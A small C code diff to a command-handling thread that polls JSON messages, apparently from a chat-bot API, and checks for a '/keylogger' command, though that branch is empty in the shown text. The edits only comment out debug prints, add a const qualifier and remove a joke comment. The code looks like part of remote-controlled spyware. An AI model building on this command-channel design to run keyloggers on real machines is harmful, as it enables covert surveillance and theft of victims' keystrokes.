@@ -137,8 +137,8 @@ void* handle_cmds() {
       json_object_object_get_ex(obj, "ok", &ok);
       json_object_object_get_ex(obj, "result", &result);
 
-      printf("Ok: %d\n", json_object_get_boolean(ok));
-      printf("Result Size: %zu\n", json_object_get_array(result)->length);
+      // printf("Ok: %d\n", json_object_get_boolean(ok));
+      // printf("Result Size: %zu\n", json_object_get_array(result)->length);
 
       update_len = json_object_array_length(result);
       if (update_len > 0) {
@@ -151,7 +151,7 @@ void* handle_cmds() {
             int d = json_object_get_int(json_object_object_get(message_obj, "date"));
             if (d >= init_date) {
               // Now we actually do something
-              char* cmd_label = json_object_get_string(json_object_object_get(message_obj, "text"));
+              const char* cmd_label = json_object_get_string(json_object_object_get(message_obj, "text"));
               if (strcmp(cmd_label, "/keylogger") == 0) {
                 // Continue
               }
@@ -167,8 +167,5 @@ void* handle_cmds() {
   }
 
   printf("INFO: Shutting down command thread.\n");
-
-  // printf("Hi mate I am so cool did you know that?");
-  // fflush(stdout);
   pthread_exit(NULL);
 }
